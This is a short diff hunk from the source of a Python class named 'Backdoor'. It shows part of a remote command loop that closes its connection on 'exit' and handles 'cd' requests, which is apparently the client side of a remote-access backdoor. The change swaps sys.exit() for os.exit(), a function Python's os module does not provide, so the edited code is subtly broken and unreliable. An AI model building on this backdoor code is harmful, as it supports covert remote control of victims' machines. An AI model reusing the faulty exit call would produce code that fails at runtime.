@@ -44,7 +44,7 @@ class Backdoor:
         try:
             if command[0] == "exit":
                 self.connection.close()
-                sys.exit()
+                os.exit()
 
             elif command[0] == "cd":
                 if len(command) > 1:
